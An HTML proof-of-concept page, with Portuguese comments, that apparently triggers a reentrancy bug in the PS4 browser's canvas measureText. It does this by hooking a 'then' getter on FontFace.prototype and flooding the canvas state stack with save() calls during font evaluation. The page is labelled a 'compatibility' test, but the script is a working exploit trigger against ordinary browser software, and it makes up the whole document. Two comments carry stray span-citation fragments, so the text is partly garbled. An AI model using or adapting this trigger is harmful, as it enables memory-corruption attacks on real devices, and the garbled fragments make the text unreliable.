<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC - PS4 Canvas measureText Reentrancy Compatibility</title>
</head>
<body>
<script>
    // Cria uma fonte baseada numa tipografia local suportada
    let face = new FontFace('PS4CompatTest', 'local(Arial)');
    face.loaded;
    document.fonts.add(face);

    let canvas = document.createElement('canvas');
    canvas.width = 100;
    canvas.height = 100;
    let ctx = canvas.getContext('2d');
    
    // Configura o estado inicial da fonte no contexto
    ctx.font = '10px PS4CompatTest';

    let reentered = false;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (reentered) return undefined;
            reentered = true;
            
            // Força a manipulação reentrante da pilha de estados 
            // durante o ciclo de avaliação de fontes do PS4[span_5](start_span)[span_5](end_span)[span_6](start_span)[span_6](end_span)
            for (let i = 0; i < 500; i++) {
                ctx.save();
                ctx.lineWidth = 1 + (i % 10);
            }
            
            reentered = false;
            return undefined;
        }
    });

    // Dispara measureText, forçando a chamada a accessFont() e font.width()[span_7](start_span)[span_7](end_span)[span_8](start_span)[span_8](end_span)
    ctx.measureText('Teste Compatibilidade PS4');
</script>
</body>
</html>
